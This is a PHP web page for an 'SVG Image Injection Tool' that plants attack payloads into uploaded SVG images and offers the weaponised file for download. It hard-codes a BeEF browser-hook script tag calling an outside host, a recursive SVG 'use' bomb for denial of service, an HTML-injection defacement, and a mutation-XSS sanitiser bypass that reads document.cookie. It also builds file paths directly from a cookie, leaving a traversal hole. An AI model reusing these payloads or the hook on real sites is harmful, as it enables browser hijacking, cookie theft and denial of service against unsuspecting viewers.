<?php
include './functions.php';

//cancel button
if(isset($_POST['cancel']) && $_POST['cancel'] == 'Cancel'){
    delete_img_cookie();
    header('location: index.php');
}

//user submitted svg image
if(isset($_POST['svg_submit'])){
    //call upload image script to process
    if(uploadImage($_FILES['SVGToUpload'], "User_SVG/")){    
        //refresh the page to allow cookie to be set
        header('location: injection.php');
    }else{
        echo "<script>alert('No file was uploaded!')</script>";
    }
}

//check if a filename cookie exist
if(isset($_COOKIE['file'])){
    //read the svg content into string
    $myfile = fopen("User_SVG/".$_COOKIE['file'], "r") or die("Unable to open file!");
    $svgContent=fread($myfile, filesize("User_SVG/".$_COOKIE['file']));
    fclose($myfile); 
    //get all elements
    $elements=findallelements($svgContent);
}

//user submit payload
if(isset($_POST['payload_submit'])){
    $tag = $_POST['element'];
    if($_POST['inject_option']=='beef'){
        $payload='<script src="http://192.168.1.18:3000/hook.js" type="text/javascript"></script>';
    }

    //if user choose html injection option as injection
    else if($_POST['inject_option']=='htmlInj'){
        if(!empty($_POST['html_payload'])){
            $bypass1 = '<foreignObject class="node" x="100" y="100" width="400" height="400"><body xmlns="http://www.w3.org./1999/xhtml">';
            $bypass2 = '</body></foreignObject>';
            $payload = $bypass1 . $_POST['html_payload']. $bypass2;

        }
        else{
            
        $payload='<foreignObject class="node" x="100" y="100" width="400" height="400"><body xmlns="http://www.w3.org./1999/xhtml"><h1 style="font-size: 60px"><a href="https://google.com/">YOU ARE HACKED</a></h1></body></foreignObject>';

        }
    }

    //xml bomb
    else if($_POST['inject_option'] == 'xml'){
        setcookie("xml",true);
        
        $payload='<defs>
        <g id="a0">
            <circle stroke="#000000" fill="#7FFFD4" fill-opacity="0.5" r="50" />
        </g>
        <g id="a1">
            <use x="0" y="10" href="#a0" />
            <use x="10" y="10" href="#a0" />
            <use x="20" y="10" href="#a0" />
            <use x="30" y="10" href="#a0" />
            <use x="40" y="10" href="#a0" />
        </g>
        <g id="a2">
            <use x="0" y="10" href="#a1" />
            <use x="10" y="10" href="#a1" />
            <use x="20" y="10" href="#a1" />
            <use x="30" y="10" href="#a1" />
            <use x="40" y="10" href="#a1" />
        </g>
        <g id="a3">
            <use x="0" y="10" href="#a2" />
            <use x="10" y="10" href="#a2" />
            <use x="20" y="10" href="#a2" />
            <use x="30" y="10" href="#a2" />
            <use x="40" y="10" href="#a2" />
        </g>
        <g id="a4">
            <use x="0" y="10" href="#a3" />
            <use x="10" y="10" href="#a3" />
            <use x="20" y="10" href="#a3" />
            <use x="30" y="10" href="#a3" />
            <use x="40" y="10" href="#a3" />
        </g>
        <g id="a5">
            <use x="0" y="10" href="#a4" />
            <use x="10" y="10" href="#a4" />
            <use x="20" y="10" href="#a4" />
            <use x="30" y="10" href="#a4" />
            <use x="40" y="10" href="#a4" />
        </g>
        <g id="a6">
            <use x="0" y="10" href="#a5" />
            <use x="10" y="10" href="#a5" />
            <use x="20" y="10" href="#a5" />
            <use x="30" y="10" href="#a5" />
            <use x="40" y="10" href="#a5" />
        </g>
        <g id="a7">
            <use x="0" y="10" href="#a6" />
            <use x="10" y="10" href="#a6" />
            <use x="20" y="10" href="#a6" />
            <use x="30" y="10" href="#a6" />
            <use x="40" y="10" href="#a6" />
        </g>
        <g id="a8">
            <use x="0" y="10" href="#a7" />
            <use x="10" y="10" href="#a7" />
            <use x="20" y="10" href="#a7" />
            <use x="30" y="10" href="#a7" />
            <use x="40" y="10" href="#a7" />
        </g>
        </defs>
        <use x="0" y="10" href="#a8" />
        ';
    }

    //if user choose user input option as injection
    else if($_POST['inject_option']=='user_input'){
        //inject into svg string
        $payload=$_POST['manual_payload'];
    }

    //if user choose XSS option as injection
    else if($_POST['inject_option']=='xss'){
        $bypass1 = '<p><form><math><mtext></form><form><mglyph><style></math><img src onerror=\'';
        $bypass2 = '\'>';
        if(!empty($_POST['xss_payload'])){
            $payload = $bypass1 . $_POST['xss_payload']. $bypass2;
        }
        else{
            $payload='<p><form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.cookie) src>">';
    
        }
    }
    
    //inject payload into the svg
    $svgContent=inject_into_svg($svgContent, $payload, $tag);

    //rewrite into the file with edited svg
    $myfile = fopen("User_SVG/".$_COOKIE['file'], "w") or die("Unable to open file!");
    fwrite($myfile,$svgContent);
    fclose($myfile);
    header('location: injection.php');
}
?>

<!DOCTYPE html>
<html>
<head>
    <!-- jQuery library -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" >
    <style>
        .opt {
            display: none;
        }
    </style>
    
    <script>
        $(document).ready(function() {
                        $('input[type="radio"]').click(function() {
                            var inputValue = $(this).attr("value");
                            var targetBox = $("." + inputValue);
                            $(".opt").not(targetBox).hide();
                            $(targetBox).show();
                            $('.sub').show();
                        });
                    });
    </script>
</head>
    
<body>
    <header class="bg-dark text-white py-3">
        <div class="container">
            <div class="row">
                <div class="col-12 col-md-6">
                    <h1>SVG Image Injection Tool</h1>
                </div>
                <div class="col-12 col-md-6">
                    <nav class="navbar navbar-expand-lg navbar-dark bg-dark justify-content-end">
                        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                            <span class="navbar-toggler-icon"></span>
                        </button>
                        <div class="collapse navbar-collapse" id="navbarNav">
                            <ul class="navbar-nav">
                                <li class="nav-item">
                                    <a class="nav-link" href="./index.php">Home</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="./beef.php">BeEF</a>
                                </li>
                            </ul>
                        </div>
                    </nav>
                </div>
            </div>
        </div>
    </header>

    <div class="container my-5">
        <div class="row">
            <div class="col-12 col-md-10"> 
                <!-- choose inject option form  -->
                <form action="injection.php" method="post">      
                    <div class="form-group">
                        <h2>Please choose options for payload injection:</h2>
                        <div class="form-check opt">
                            <input class="form-check-input" type="radio" name="inject_option" id="BeEF" value="beef">
                            <label class="form-check-label" for="BeEF">BeEF</label>
                        </div>
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="inject_option" id="XMLBomb" value="xml">
                            <label class="form-check-label" for="XMLBomb">XML Bomb</label>
                        </div>
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="inject_option" id="HTMLInj" value="htmlInj">
                            <label class="form-check-label" for="HTMLInj">HTML Injection</label>
                        </div>
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="inject_option" id="XSS" value="xss">
                            <label class="form-check-label" for="XSS">XSS</label>
                        </div>
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="inject_option" id="user_input" value="user_input">
                            <label class="form-check-label" for="user_input">User Input</label>
                        </div>
                    </div>
                    
                    <div class="form-group opt sub">
                        <h2>Choose an element to be inserted after:</h2>
                        <?php 
                        if(isset($elements)){
                            echo "<select class='form-control' name='element' >";
                            foreach($elements as $element)
                            {
                                echo "<option value='".$element."'>".$element."</option>";
                            }
                            echo "</select>";
                        }
                        ?>
                    </div>

                    <div class="form-group">
                        <div class="mb-3 opt beef ">
                            <h4>BeEF</h4>
                        </div>

                        <div class="mb-3 opt xml ">
                             <h4> Proceed with XML Bomb</h4>
                        </div>

                        <div class="mb-3 opt htmlInj ">
                            <label class="form-label" for="html_payload"><h4>Provide HTML to be injected if any:</h4></label>
                            <input type="text" class="form-control" id="html_payload" name="html_payload">
                        </div>

                        <div class="mb-3 opt xss ">
                            <label class="form-label" for="xss_payload"><h4>Provide script to be injected if any:</h4></label>
                            <input type="text" class="form-control" id="xss_payload" name="xss_payload">
                        </div>

                        <div class="mb-3 opt user_input ">
                            <label class="form-label" for="manual_payload"><h4>Provide payload to be injected:</h4></label>
                            <input type="text" class="form-control" id="manual_payload" name="manual_payload">
                        </div>

                        <input type="submit" class="btn btn-primary opt sub" value="Submit" name="payload_submit">
                        <input type="submit" class="btn btn-secondary" value="Cancel" name="cancel">
                    </div>
                </form>
            </div>
        </div>
        <div class="row my-5">
                <div class='col-sm-6'>
                    <h3>SVG Image embed in IMG tag</h3>
                    <img src="<?php if(isset($_COOKIE['xml']) && $_COOKIE['xml']==true){}else{echo "User_SVG/".$_COOKIE['file'];} ?>" width="500" height="600"><br>
                </div>
                <div class='col-sm-6'>
                    <h3>SVG XML</h3>
                    <?php 
                        if(isset($svgContent)){
                            echo htmlspecialchars($svgContent)."<br>";
                        }
                    ?>  
                </div>
                
                <!--
                <div class='col-sm-6'>
                    <h3>SVG Image rendered directly</h3>
                    <?php 
                        //echo "<iframe width='600' height='600' srcdoc='".file_get_contents("User_SVG/".$_COOKIE['file'])."'></iframe>";
                    ?>
                </div>
                    -->
                <!-- download svg -->
                
        </div>
        <a href="download.php"><button class="btn btn-primary">Download SVG</button></a>

    </div>
</body>
</html>